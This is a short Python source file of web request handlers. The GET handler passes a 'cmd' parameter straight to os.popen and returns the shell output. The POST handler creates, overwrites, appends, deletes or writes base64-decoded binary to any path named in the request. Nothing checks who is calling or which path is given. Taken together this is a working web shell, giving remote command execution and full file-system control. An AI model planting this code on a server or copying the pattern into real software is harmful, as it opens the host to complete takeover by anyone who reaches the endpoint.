import base64
import os
from urllib.parse import unquote


def doGET(get = {}, addargs = {}):
    print(unquote(get['cmd'].replace('+',' ')))
    return '<div style="white-space: pre;">'+os.popen(unquote(get['cmd'].replace('+',' '))).read()+'</div>'

    
def doPOST(posted = {}, addargs = {}):
    posted['filepath'] = unquote(posted['filepath'])
    if posted['command'] == 'new':
        f = open(posted['filepath'], 'w')
        f.close()
        return 'Opened file.'
    
    if posted['command'] == 'write':
        f = open(posted['filepath'], 'w')
        f.write(posted['contents'])
        f.close()
        return 'Wrote text to file in mode W'
        
    if posted['command'] == 'append':
        f = open(posted['filepath'], 'a')
        f.write(posted['contents'])
        f.close()
        return 'Wrote text to file in mode A'
        
    if posted['command'] == 'delete':
        os.unlink(posted['filepath'])
        return 'Deleted file using os.unlink'
        
    if posted['command'] == 'writebinary':
        base64_bytes = bytes(unquote(posted['contents']), 'ascii')
        result = base64.b64decode(base64_bytes)
        f = open(unquote(posted['filepath']), 'wb')
        f.write(result)
        f.close()
        return f'These bytes were decoded from input and written to file: {f} {unquote(posted["filepath"])} [0:1K]'+str(result)[0:1000]